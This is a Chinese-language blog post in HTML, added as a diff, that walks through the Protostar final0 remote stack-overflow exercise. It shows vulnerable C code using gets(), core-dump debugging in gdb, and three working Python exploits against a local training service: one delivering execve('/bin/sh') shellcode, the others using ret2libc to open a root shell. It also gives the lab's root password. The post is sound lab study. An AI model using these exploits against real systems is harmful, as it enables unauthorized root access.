@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Binary-Hacking," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="终于到了final部分(°ཀ°) final部分将之前学过的知识都综合起来了，难度稍有提升。主要还是多熟悉一下才学的网络部分。">
+<meta name="keywords" content="Binary-Hacking">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Liveoverflow-0x1D-final0">
+<meta property="og:url" content="http://yoursite.com/2018/11/09/Liveoverflow-0x1D-final0/index.html">
+<meta property="og:site_name" content="Muirelle的博客">
+<meta property="og:description" content="终于到了final部分(°ཀ°) final部分将之前学过的知识都综合起来了，难度稍有提升。主要还是多熟悉一下才学的网络部分。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/g47drkO.png">
+<meta property="og:image" content="https://i.imgur.com/iswbFrg.png">
+<meta property="og:image" content="https://i.imgur.com/SP8oMSg.png">
+<meta property="og:image" content="https://i.imgur.com/ugRMrKL.png">
+<meta property="og:image" content="https://i.imgur.com/9eWFBaz.png">
+<meta property="og:image" content="https://i.imgur.com/08TrhfY.png">
+<meta property="og:image" content="https://i.imgur.com/lxSqiBM.png">
+<meta property="og:image" content="https://i.imgur.com/N0WE2Iq.png">
+<meta property="og:image" content="https://i.imgur.com/PfJ4MTc.png">
+<meta property="og:image" content="https://i.imgur.com/JyklBMM.png">
+<meta property="og:image" content="https://i.imgur.com/4L6jYv2.png">
+<meta property="og:image" content="https://i.imgur.com/BX6hgQP.png">
+<meta property="og:image" content="https://i.imgur.com/V4xBC5f.png">
+<meta property="og:image" content="https://i.imgur.com/d9DW9h3.png">
+<meta property="og:image" content="https://i.imgur.com/LhsjIln.png">
+<meta property="og:image" content="https://i.imgur.com/po6Mei4.png">
+<meta property="og:image" content="https://i.imgur.com/Z6xTplL.png">
+<meta property="og:image" content="https://i.imgur.com/DSWIEkS.png">
+<meta property="og:image" content="https://i.imgur.com/fBO0sK2.png">
+<meta property="og:image" content="https://i.imgur.com/MbwYZ5p.png">
+<meta property="og:image" content="https://i.imgur.com/ET3qCA6.png">
+<meta property="og:image" content="https://i.imgur.com/xXmQ5Ez.png">
+<meta property="og:image" content="https://i.imgur.com/F97KcUN.png">
+<meta property="og:image" content="https://i.imgur.com/yctTz06.png">
+<meta property="og:image" content="https://i.imgur.com/Ijr8ksM.png">
+<meta property="og:image" content="https://i.imgur.com/40r4Dx2.png">
+<meta property="og:updated_time" content="2018-11-11T06:03:32.281Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Liveoverflow-0x1D-final0">
+<meta name="twitter:description" content="终于到了final部分(°ཀ°) final部分将之前学过的知识都综合起来了，难度稍有提升。主要还是多熟悉一下才学的网络部分。">
+<meta name="twitter:image" content="https://i.imgur.com/g47drkO.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/09/Liveoverflow-0x1D-final0/"/>
+
+
+
+
+
+  <title>Liveoverflow-0x1D-final0 | Muirelle的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Muirelle的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/09/Liveoverflow-0x1D-final0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Muirelle">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Muirelle的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Liveoverflow-0x1D-final0</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-09T09:41:00+08:00">
+                2018-11-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/09/Liveoverflow-0x1D-final0/" class="leancloud_visitors" data-flag-title="Liveoverflow-0x1D-final0">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>终于到了final部分(°ཀ°)</p>
+<p>final部分将之前学过的知识都综合起来了，难度稍有提升。主要还是多熟悉一下才学的网络部分。<br><a id="more"></a></p>
+<p>视频链接：<a href="http://liveoverflow.com/binary_hacking/" target="_blank" rel="noopener">http://liveoverflow.com/binary_hacking/</a></p>
+<hr>
+<h1 id="Protostar-Final0"><a href="#Protostar-Final0" class="headerlink" title="Protostar Final0"></a>Protostar Final0</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>This level combines a stack overflow and network programming for a remote overflow.</strong></p>
+<p><strong>Hints: depending on where you are returning to, you may wish to use a toupper() proof shellcode.</strong></p>
+<p><strong>Core files will be in /tmp</strong></p>
+<p><strong>This level is at /opt/protostar/bin/final0</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"final0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2995</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read the username in from the network</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">get_username</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="keyword">char</span> *q;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Strip off trailing new line characters */</span></span><br><span class="line">  q = <span class="built_in">strchr</span>(buffer, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">  q = <span class="built_in">strchr</span>(buffer, <span class="string">'\r'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Convert to lower case */</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(buffer); i++) &#123;</span><br><span class="line">      buffer[i] = <span class="built_in">toupper</span>(buffer[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Duplicate the string and return it */</span></span><br><span class="line">  <span class="keyword">return</span> strdup(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  username = get_username();</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No such user %s\n"</span>, username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>主函数和前面net一样，直接看<code>get_username</code>。定义了一个512字节大小的字符串数组，接着将其置零。随后调用了<code>gets</code>将输入放在buffer中。很明显要<strong>利用<code>gets</code>将字符串溢出到return，覆盖其返回指针(也就是eip)到我们的shellcode处</strong>。</p>
+<p>但是注意到中间还有两段代码，一段是用<code>strchr</code>查找字符串中的换行符(\n)和回车符(\r)，如果字符串中出现了，就将其首次出现的位置的值置零。</p>
+<blockquote>
+<p><em>The <code>strchr()</code> function returns a pointer to the first occurrence of the character c in the string s.</em></p>
+</blockquote>
+<p>第二段for循环是通过<code>toupper()</code>将整个字符串的字母变为大写。所以，shellcode中所有在小写字母(0x61~0x7a)范围内的数据都会被<code>toupper</code>转化为大写字母(0x41~0x5a),除非确保shellcode中不出现小写字母范围内的数据，否则shellcode就会被<code>toupper</code>破坏掉。</p>
+<p>有什么办法可以绕过<code>toupper</code>呢？</p>
+<p>首先保证shellcode中没有小写字母范围是数据是不太现实的，不考虑。所以就只有让<code>toupper</code>在shellcode之前停止转化。它所转化的长度是从<code>strlen</code>得到的，而<code>strlen</code>计算字符串长度时是将空字符(\x00)作为一个字符串的结尾。</p>
+<blockquote>
+<p><em>The strlen() function calculates the length of the string s, not including the terminating ‘\0’ character.</em></p>
+</blockquote>
+<p><strong>所以我们可以在shellcode之前放置一个空字符来阻断<code>strlen</code>的读取，这样就能保证shellcode不会被转化。</strong>(我一开始以为gets读取数据时会在空字符处停下，就一直不知道该怎么样才能把空字符输入进去。。其实gets只会在换行或者EOF时停止。论man page的重要性~)</p>
+<blockquote>
+<p>gets()  reads  a  line from stdin into the buffer pointed to by s until either a terminating newline or EOF,which it replaces with ‘\0’.</p>
+</blockquote>
+<p>先测试一下，字符串转化为了大写，没问题。<br><img src="https://i.imgur.com/g47drkO.png" alt=""></p>
+<p>写一小段脚本测试一下<br><img src="https://i.imgur.com/iswbFrg.png" alt=""><br>可见并没有传回任何字符串，所以我们应该是通过溢出把返回地址覆盖掉了，没有返回到<code>main</code>，自然就不会传回字符串。但是现在怎么debug这个程序呢？直接<code>gdb ./final0</code>肯定不行，因为接收的数据是从远程传入的，虽然能看到反汇编的代码，但是我们需要动态调试才能更清楚知道具体发生了什么。</p>
+<p>回去看一眼题目：<strong>Core files will be in /tmp</strong>。这个core file是什么东西？</p>
+<p><strong>man core</strong>看一眼</p>
+<blockquote>
+<p><em>NAME</em><br>     <em>core - core dump file</em><br><em>DESCRIPTION</em><br>       <em>The  default  action  of  certain signals is to cause a process to terminate and produce a core dump file, a disk file containing an image of the process’s memory at the time of termination.  This image can be used in a debugger (e.g., gdb(1)) to inspect the state of the program at the time that it terminated.  A list of the signals which cause a process to dump core can be found in signal(7).</em></p>
+</blockquote>
+<p><strong>说白了<a href="https://en.wikipedia.org/wiki/Core_dump" target="_blank" rel="noopener">core dump file</a>(核心转储文件)就是在程序因为接收到系统的某些信号或者崩溃时而强制中断时所产生的文件，而这个文件包含了程序在中断时一些内存的信息，并且这个文件可以被gdb调试。</strong></p>
+<p>上面还提到了signal可以在signal(7)查看，<strong>man 7 signal</strong>看一眼。</p>
+<p><img src="https://i.imgur.com/SP8oMSg.png" alt=""><br>当中有一部分的signal我们已经很熟悉了，像什么<strong>SIGSEGV</strong>、<strong>SIGILL</strong>经常在栈溢出的时候遇见。这些信号中大部分都能导致core dump file的产生。</p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p><img src="https://i.imgur.com/ugRMrKL.png" alt=""></p>
+<p>由于刚才的溢出，/tmp里确实生成了一个文件(第一个)，不说废话直接进gdb。</p>
+<p>用gdb调试core dump file的格式是</p>
+<pre><code>gdb 原始程序路径 核心转储文件路径
+</code></pre><p>调试之前记得要有root权限，密码godmode。</p>
+<p><img src="https://i.imgur.com/9eWFBaz.png" alt=""><br>可以看到一进gdb就提示<strong>Segmentation fault</strong>，和猜想的一样，确实覆盖了返回地址。</p>
+<p>然后就好办了，计算一下偏移量，规划一下payload。<br><img src="https://i.imgur.com/08TrhfY.png" alt=""><br>红框位置是返回地址，也就是FFFF，覆盖为随便往后一点的地址，接下来依次放空字符、nop指令块(为了提高exploit的容错性)，最后是shellcode。</p>
+<p>最后exploit如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2995</span>))</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">511</span> + <span class="string">"\x00"</span> + <span class="string">"AAAABBBBCCCCDDDDEEEE"</span></span><br><span class="line">ret = struct.pack(<span class="string">"I"</span>, <span class="number">0xbffffc5c</span>+<span class="number">30</span>)</span><br><span class="line">nop = <span class="string">"\x90"</span>*<span class="number">100</span></span><br><span class="line">payload = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line">s.send(padding + ret + nop + payload + <span class="string">"\n"</span>)</span><br><span class="line">s.send(<span class="string">"id\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">"uname -a\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></p>
+<p>注意send的最后加一个换行符是为了确保gets能正确的结束读取。</p>
+<p>使用的shellcode是上次做0x0E用到的。<br>传送门：<a href="https://muirelle.com/2018/10/03/Liveoverflow-0x0E-Shellcode/" target="_blank" rel="noopener">https://muirelle.com/2018/10/03/Liveoverflow-0x0E-Shellcode/</a></p>
+<p><img src="https://i.imgur.com/lxSqiBM.png" alt=""><br>拿到shell</p>
+<h1 id="再次分析"><a href="#再次分析" class="headerlink" title="再次分析"></a>再次分析</h1><p><del>因为手贱</del>出于好奇心，我想确认一下空字符是否真的起了作用，于是就把脚本里面的空字符删了(前面的A相应的多加一个，变成512个)再运行一次。结果让我感觉我刚刚做的题都白做了，删了空字符一样能拿到shell，震惊了。</p>
+<p>经过大佬的指点，我检查了一遍shellcode，确保不是真的运气好到爆棚遇到第一种情况了，shellcode中确实存在在小写字母范围内的数据。所以只能是第二种情况，shellcode前面还有非人为添加的空字符。</p>
+<p>进gdb看个明白</p>
+<p>这里需要gdb调试正在运行的程序，所以加上参数-p。用<code>pidof 程序名</code>命令获取正在运行的程序的pid。同样需要root权限才能调试。<br><img src="https://i.imgur.com/N0WE2Iq.png" alt=""></p>
+<p>进入gdb后可以看到accept已经在运行中了，意味着这个程序正在等待客户端的连接。因为数据处理都是在子程序完成的，所以还要用<strong>set follow-fork-mode child</strong>命令让gdb跟踪子程序，不然没办法调试外面传入的数据。</p>
+<p><img src="https://i.imgur.com/PfJ4MTc.png" alt=""></p>
+<p><img src="https://i.imgur.com/JyklBMM.png" alt=""><br>在<code>gets</code>和for循环外面找个地方下断点。然后<strong>c</strong>命令让程序跑起来。</p>
+<p>新开一个终端运行不带空字符的脚本。(为了直观，我把A改成了a)</p>
+<p><img src="https://i.imgur.com/4L6jYv2.png" alt=""></p>
+<p>断点gets：padding(红框)、返回地址(蓝框)、nop块(黄框)、shellcode(橙框)依次排列，没问题，继续。</p>
+<p><img src="https://i.imgur.com/BX6hgQP.png" alt=""></p>
+<p>for循环外的断点：先注意到一大片的a已经被替换成A了，但是shellcode安然无恙。白框部分被自动替换成0x200。很明显，就是这些\x00让<code>strlen</code>认为已经读到了字符串的末尾，所以<code>toupper</code>没有继续往后转换。问题来了，这个0x200是谁放上去的。。。？</p>
+<p>0x200，刚好等于512，难道。。。是<code>strlen</code>把0x200放在这的？除了<code>strlen</code>题目中没有其他函数可以计算出0x200这个值，但是这并不符合逻辑，strlen是先计算长度再放置数据的，不可能一开始就在某一个地方占个0，计算完前面的长度在把数据放到上面，这样太蠢了。所以在strlen调用前一定有其他函数做过手脚。</p>
+<p>不得不开始单步调试(눈‸눈)</p>
+<p><img src="https://i.imgur.com/V4xBC5f.png" alt=""><br>反汇编一下源码，红框和蓝框部分分别是源码中两次调用<code>strchr</code>并置零的部分，从0xa(换行)，0xd(回车)可以看出。而就是橙框和绿框将上一张图的白框位置先后置零了。所以这个过程应该是：<strong><code>strchr</code>将返回值传给ax，然后ax的值被放在</strong>ebp-0x10<strong>，正好就是白框的位置。而白框正好位于程序一开始申请的512字节大小的内存后面，所以if语句认为白框的位置的内存是空闲的，就将ax的值放进去，再和0作比较(源码中的if语句)，如果相等的话说明没有找到指定的字符，不相等的话说明ax就是找到的那个字符的地址，则je语句不执行，接着两行代码将0放在ax指向的位置。</strong></p>
+<p>红框和蓝框做的事情相同，恰好shellcode中没有出现\x0a或者\x0d，所以有8字节的空字符。</p>
+<p>现在知道空字符是怎么来的了，那0x200呢？接着调试。</p>
+<p><img src="https://i.imgur.com/d9DW9h3.png" alt=""></p>
+<p><img src="https://i.imgur.com/LhsjIln.png" alt=""></p>
+<p><img src="https://i.imgur.com/po6Mei4.png" alt=""></p>
+<p>并不是一下子就到了0x200，而是一字节一字节增长的(是从0开始的，前面没截到图(´-ι_-｀))，所以可以断定这是变量 <strong>i</strong> 而不是<code>strlen</code>放上去的。</p>
+<p><img src="https://i.imgur.com/Z6xTplL.png" alt=""></p>
+<p>而<code>strlen</code>检测到的长度直接放在ax中，马上就和bx进行比较了，所以再次确定不关<code>strlen</code>的事。</p>
+<p><strong>最后可以确定下来，if语句需要四字节的内存存放<code>strchr</code>的返回值用于和0比较，不管<code>strchr</code>有没有找到指定的字符，这四个字节都会被置零(一种是被返回值置零，一种是被if置零),较后运行的<code>strlen</code>就被这几个0给挡住了，后面的数据不管怎样也不会变成大写了。。。</strong></p>
+<p>strlen：strchr，这锅你背。</p>
+<p>strchr：不管我事啊，是if的锅啊。</p>
+<p>toupper：闭嘴，你们几个都是坑b。</p>
+<p>到头来还是我被坑了(╯’-‘)╯ ┻━━━┻</p>
+<h1 id="再次解题"><a href="#再次解题" class="headerlink" title="再次解题"></a>再次解题</h1><p>用返回到栈里执行shellcode的方法既不可靠也不高大上，所以换一种方法解题。</p>
+<p><strong>ret2libc</strong>。这个办法之前做stack部分的时候也用到过，比单纯返回栈执行shellcode可靠。</p>
+<p>既然要ret2libc就要先找到有哪些已经在内存中的libc的函数可以被我们利用。</p>
+<p><img src="https://i.imgur.com/DSWIEkS.png" alt=""></p>
+<p><code>info functions @plt</code>查看可用的函数(先su拿到root)</p>
+<p><img src="https://i.imgur.com/fBO0sK2.png" alt=""></p>
+<p>发现有<code>execve</code>，这个函数可以帮我们执行/bin/sh，就用它了。<br>记下地址<strong>0x08048c0c</strong></p>
+<blockquote>
+<p><em>execve()  executes  the  program  pointed to by filename.  filename must be either a binary executable</em></p>
+</blockquote>
+<p>写一小段程序看看用<code>execve</code>运行/bin/sh时栈内是怎么布局的，然后payload就仿照这个布局。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	execve(<span class="string">"/bin/sh"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/MbwYZ5p.png" alt=""></p>
+<p>第一个数据(红框)是返回值，也就是返回main的地址，构造payload时不用管它，随便填一个数据就行了，因为我们不需要它返回。第二个数据(蓝框)就是/bin/sh的地址，所以要找到/bin/sh的地址(libc的起始地址 + /bin/sh的偏移地址)</p>
+<p><img src="https://i.imgur.com/ET3qCA6.png" alt=""></p>
+<p><img src="https://i.imgur.com/xXmQ5Ez.png" alt=""><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2995</span>))</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">511</span> + <span class="string">"\x00"</span> + <span class="string">"AAAABBBBCCCCDDDDEEEE"</span></span><br><span class="line">execve = struct.pack(<span class="string">"I"</span>, <span class="number">0x08048c0c</span>)</span><br><span class="line">bsh = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7e97000</span> + <span class="number">1176511</span>)</span><br><span class="line">arg = <span class="string">"AAAA"</span> + bsh + <span class="string">"\x00"</span>*<span class="number">8</span></span><br><span class="line">s.send(padding + execve + arg + <span class="string">"\n"</span>)</span><br><span class="line">s.send(<span class="string">"id\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">"uname -a\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/F97KcUN.png" alt=""></p>
+<p>成功。</p>
+<p>可是这样还不够，还要再高大上一点(✧≖‿ゝ≖)</p>
+<p>使用python的telnetlib模块对服务器进行连接实现远程操控。</p>
+<p>修改后的脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2995</span>))</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">511</span> + <span class="string">"\x00"</span> + <span class="string">"AAAABBBBCCCCDDDDEEEE"</span></span><br><span class="line">execve = struct.pack(<span class="string">"I"</span>, <span class="number">0x08048c0c</span>)</span><br><span class="line">bsh = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7e97000</span> + <span class="number">1176511</span>)</span><br><span class="line">arg = <span class="string">"AAAA"</span> + bsh + <span class="string">"\x00"</span>*<span class="number">8</span></span><br><span class="line">s.send(padding + execve + arg + <span class="string">"\n"</span>)</span><br><span class="line">s.send(<span class="string">"id\n"</span>)</span><br><span class="line">s.send(<span class="string">"uname -a\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></p>
